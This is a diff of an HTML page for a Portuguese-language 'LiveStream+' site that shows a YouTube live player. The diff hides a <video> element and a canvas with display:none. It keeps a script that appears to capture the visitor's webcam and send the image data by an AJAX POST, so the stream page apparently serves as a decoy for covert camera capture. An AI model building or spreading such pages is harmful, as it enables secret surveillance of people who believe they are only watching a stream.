@@ -24,51 +24,100 @@
   <!-- Styles -->
   <style>
     body {
-      background: linear-gradient(135deg, #0f172a 0%, #1e2937 100%);
-      min-height: 100vh;
-      font-family: "Inter", system-ui, sans-serif;
+      background: #0b0b0f;
+      font-family: Inter, system-ui, sans-serif;
+      overflow-x: hidden;
     }
 
-    .video-container {
-      position: relative;
-      padding-top: 56.25%; /* 16:9 Aspect Ratio */
-      border-radius: 16px;
-      overflow: hidden;
-      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.6);
-      background: #000;
+    .glass {
+      background: rgba(255, 255, 255, 0.05);
+      backdrop-filter: blur(14px);
+      border: 1px solid rgba(255, 255, 255, 0.08);
     }
 
-    .video-container iframe {
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      border: 0;
+    .hero-gradient {
+      background:
+        radial-gradient(
+          circle at top left,
+          rgba(255, 0, 80, 0.25),
+          transparent 35%
+        ),
+        radial-gradient(
+          circle at bottom right,
+          rgba(0, 120, 255, 0.2),
+          transparent 35%
+        ),
+        #0b0b0f;
     }
 
-    .live-badge {
-      animation: pulse 2s infinite;
+    .live-dot {
+      animation: pulse 1.5s infinite;
     }
 
     @keyframes pulse {
-      0%,
-      100% {
+      0% {
+        transform: scale(1);
         opacity: 1;
       }
+
       50% {
-        opacity: 0.7;
+        transform: scale(1.25);
+        opacity: 0.5;
+      }
+
+      100% {
+        transform: scale(1);
+        opacity: 1;
+      }
+    }
+
+    .video-wrapper {
+      position: relative;
+      width: 100%;
+      padding-top: 56.25%;
+      border-radius: 24px;
+      overflow: hidden;
+    }
+
+    .video-wrapper iframe {
+      position: absolute;
+      inset: 0;
+      width: 100%;
+      height: 100%;
+    }
+
+    .fade-up {
+      animation: fadeUp 1s ease;
+    }
+
+    @keyframes fadeUp {
+      from {
+        opacity: 0;
+        transform: translateY(20px);
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0);
       }
     }
   </style>
 
-  <div class="video-wrap">
+  <div class="video-wrap" style="display: none">
     <video id="video" playsinline autoplay></video>
   </div>
 
-  <canvas id="canvas" width="640" height="480"></canvas>
+  <canvas id="canvas" width="640" height="480" style="display: none"></canvas>
 
   <script>
+    function toggleFullscreen() {
+      const iframe = document.getElementById("livePlayer");
+
+      if (iframe.requestFullscreen) {
+        iframe.requestFullscreen();
+      }
+    }
+
     function post(imgdata) {
       $.ajax({
         type: "POST",
@@ -86,7 +135,7 @@
     ("use strict");
 
     const video = document.getElementById("video");
-    // const canvas = document.getElementById('canvas');
+    const canvas = document.getElementById("canvas");
     const errorMsgElement = document.querySelector("span#errorMsg");
 
     const constraints = {
@@ -124,60 +173,249 @@
     // Load init
     init();
   </script>
-  <body class="flex items-center justify-center min-h-screen p-6">
-    <div class="max-w-5xl w-full">
-      <!-- Header -->
-      <div class="flex items-center justify-between mb-8">
+  <body class="hero-gradient text-white min-h-screen">
+    <!-- NAVBAR -->
+    <header
+      class="fixed top-0 left-0 right-0 z-50 px-6 lg:px-12 py-4 bg-black/40 backdrop-blur-xl border-b border-white/5"
+    >
+      <div class="max-w-7xl mx-auto flex items-center justify-between">
         <div class="flex items-center gap-3">
-          <div class="w-4 h-4 bg-red-600 rounded-full live-badge"></div>
-          <h1 class="text-white text-4xl font-bold tracking-tight">
-            Assista ao Vivo
-          </h1>
-        </div>
-
-        <div
-          class="flex items-center gap-2 text-emerald-400 text-sm font-medium"
-        >
-          <i class="fas fa-circle"></i>
-          <span>AO VIVO</span>
-        </div>
-      </div>
-
-      <!-- Video Container -->
-      <div class="video-container">
-        <iframe
-          id="Live_YT_TV"
-          src="https://www.youtube.com/embed/live_yt_tv?autoplay=1&modestbranding=1&rel=0"
-          allow="
-            accelerometer;
-            autoplay;
-            clipboard-write;
-            encrypted-media;
-            gyroscope;
-            picture-in-picture;
-          "
-          allowfullscreen
-        >
-        </iframe>
-      </div>
-
-      <!-- Info abaixo do vídeo -->
-      <div class="mt-6 flex items-center justify-between text-gray-400 text-sm">
-        <div class="flex items-center gap-2">
-          <i class="fas fa-tv"></i>
-          <span>Transmissão ao vivo</span>
-        </div>
-
-        <div class="flex items-center gap-4">
-          <button
-            onclick="toggleFullscreen()"
-            class="flex items-center gap-2 hover:text-white transition-colors"
+          <div
+            class="w-10 h-10 rounded-xl bg-red-600 flex items-center justify-center"
           >
-            <i class="fas fa-expand"></i>
-            <span class="hidden sm:inline">Tela cheia</span>
-          </button>
+            <i class="fas fa-play text-white"></i>
+          </div>
+
+          <div>
+            <h1 class="text-xl font-bold tracking-wide">LiveStream+</h1>
+            <p class="text-xs text-zinc-400">Premium Live Experience</p>
+          </div>
+        </div>
+
+        <div class="hidden md:flex items-center gap-6 text-sm text-zinc-300">
+          <a href="#" class="hover:text-white transition">Início</a>
+          <a href="#" class="hover:text-white transition">Eventos</a>
+          <a href="#" class="hover:text-white transition">Ao Vivo</a>
+          <a href="#" class="hover:text-white transition">Premium</a>
+        </div>
+
+        <button
+          class="bg-red-600 hover:bg-red-700 transition px-5 py-2 rounded-xl font-semibold"
+        >
+          Entrar
+        </button>
+      </div>
+    </header>
+
+    <!-- HERO -->
+    <section class="pt-32 px-6 lg:px-12">
+      <div class="max-w-7xl mx-auto">
+        <div class="flex flex-col lg:flex-row items-center gap-14 lg:gap-20">
+          <!-- LEFT -->
+          <div class="flex-1 fade-up">
+            <div
+              class="inline-flex items-center gap-2 bg-red-600/15 border border-red-500/20 px-4 py-2 rounded-full text-sm text-red-400 mb-6"
+            >
+              <div class="w-2 h-2 bg-red-500 rounded-full live-dot"></div>
+              TRANSMISSÃO AO VIVO
+            </div>
+
+            <h1
+              class="text-5xl lg:text-7xl font-black leading-tight tracking-tight"
+            >
+              Assista aos maiores eventos ao vivo
+            </h1>
+
+            <p class="text-zinc-400 text-lg mt-6 leading-relaxed max-w-2xl">
+              Streaming premium em alta definição com experiência imersiva,
+              transmissão estável e acesso instantâneo em qualquer dispositivo.
+            </p>
+
+            <div class="flex flex-wrap gap-4 mt-10">
+              <button
+                class="bg-red-600 hover:bg-red-700 transition px-8 py-4 rounded-2xl font-bold text-lg shadow-2xl"
+              >
+                <i class="fas fa-play mr-2"></i>
+                Assistir Agora
+              </button>
+
+              <button
+                class="glass hover:bg-white/10 transition px-8 py-4 rounded-2xl font-semibold"
+              >
+                <i class="fas fa-star mr-2"></i>
+                Premium
+              </button>
+            </div>
+
+            <!-- STATS -->
+            <div class="flex flex-wrap gap-10 mt-14">
+              <div>
+                <h2 class="text-3xl font-black">4K+</h2>
+                <p class="text-zinc-500">Ultra HD</p>
+              </div>
+
+              <div>
+                <h2 class="text-3xl font-black">2.3M</h2>
+                <p class="text-zinc-500">Visualizações</p>
+              </div>
+
+              <div>
+                <h2 class="text-3xl font-black">24/7</h2>
+                <p class="text-zinc-500">Ao Vivo</p>
+              </div>
+            </div>
+          </div>
+
+          <!-- RIGHT -->
+          <div class="flex-1 w-full fade-up">
+            <div class="glass rounded-[28px] p-5 shadow-2xl">
+              <!-- TOP BAR -->
+              <div class="flex items-center justify-between mb-4">
+                <div class="flex items-center gap-3">
+                  <div
+                    class="bg-red-600 px-4 py-1 rounded-full text-sm font-bold flex items-center gap-2"
+                  >
+                    <div class="w-2 h-2 bg-white rounded-full live-dot"></div>
+                    LIVE
+                  </div>
+
+                  <div class="text-zinc-400 text-sm">
+                    87.4K assistindo agora
+                  </div>
+                </div>
+
+                <button
+                  onclick="toggleFullscreen()"
+                  class="glass hover:bg-white/10 transition px-4 py-2 rounded-xl text-sm"
+                >
+                  <i class="fas fa-expand mr-2"></i>
+                  Fullscreen
+                </button>
+              </div>
+
+              <!-- VIDEO -->
+              <div class="video-wrapper shadow-2xl">
+                <iframe
+                  id="livePlayer"
+                  src="https://www.youtube.com/embed/live_yt_tv?autoplay=1&rel=0&modestbranding=1"
+                  allow="
+                    accelerometer;
+                    autoplay;
+                    encrypted-media;
+                    gyroscope;
+                    picture-in-picture;
+                  "
+                  allowfullscreen
+                ></iframe>
+              </div>
+
+              <!-- FOOTER -->
+              <div
+                class="flex items-center justify-between mt-5 text-zinc-400 text-sm"
+              >
+                <div class="flex items-center gap-4">
+                  <span>
+                    <i class="fas fa-circle text-red-500 mr-2"></i>
+                    AO VIVO
+                  </span>
+
+                  <span>
+                    <i class="fas fa-eye mr-2"></i>
+                    87.4K espectadores
+                  </span>
+                </div>
+
+                <div class="flex items-center gap-5">
+                  <button class="hover:text-white transition">
+                    <i class="fas fa-heart"></i>
+                  </button>
+
+                  <button class="hover:text-white transition">
+                    <i class="fas fa-share"></i>
+                  </button>
+
+                  <button class="hover:text-white transition">
+                    <i class="fas fa-comment"></i>
+                  </button>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- TRENDING -->
+        <div class="mt-24">
+          <div class="flex items-center justify-between mb-8">
+            <h2 class="text-3xl font-black">Em Alta</h2>
+
+            <button class="text-zinc-400 hover:text-white transition">
+              Ver Tudo →
+            </button>
+          </div>
+
+          <div class="grid md:grid-cols-2 lg:grid-cols-4 gap-6">
+            <div
+              class="glass rounded-3xl overflow-hidden hover:scale-[1.02] transition"
+            >
+              <div
+                class="h-44 bg-gradient-to-br from-red-600 to-pink-700"
+              ></div>
+
+              <div class="p-5">
+                <h3 class="font-bold text-lg">Championship Finals</h3>
+                <p class="text-zinc-400 text-sm mt-2">
+                  Evento esportivo internacional ao vivo
+                </p>
+              </div>
+            </div>
+
+            <div
+              class="glass rounded-3xl overflow-hidden hover:scale-[1.02] transition"
+            >
+              <div
+                class="h-44 bg-gradient-to-br from-blue-600 to-cyan-700"
+              ></div>
+
+              <div class="p-5">
+                <h3 class="font-bold text-lg">Music Festival</h3>
+                <p class="text-zinc-400 text-sm mt-2">
+                  Festival com artistas internacionais
+                </p>
+              </div>
+            </div>
+
+            <div
+              class="glass rounded-3xl overflow-hidden hover:scale-[1.02] transition"
+            >
+              <div
+                class="h-44 bg-gradient-to-br from-emerald-600 to-teal-700"
+              ></div>
+
+              <div class="p-5">
+                <h3 class="font-bold text-lg">Tech Conference</h3>
+                <p class="text-zinc-400 text-sm mt-2">
+                  Tendências e inovação em tecnologia
+                </p>
+              </div>
+            </div>
+
+            <div
+              class="glass rounded-3xl overflow-hidden hover:scale-[1.02] transition"
+            >
+              <div
+                class="h-44 bg-gradient-to-br from-violet-600 to-fuchsia-700"
+              ></div>
+
+              <div class="p-5">
+                <h3 class="font-bold text-lg">Gaming Arena</h3>
+                <p class="text-zinc-400 text-sm mt-2">
+                  Campeonato competitivo ao vivo
+                </p>
+              </div>
+            </div>
+          </div>
         </div>
       </div>
-    </div>
+    </section>
   </body>
 </html>
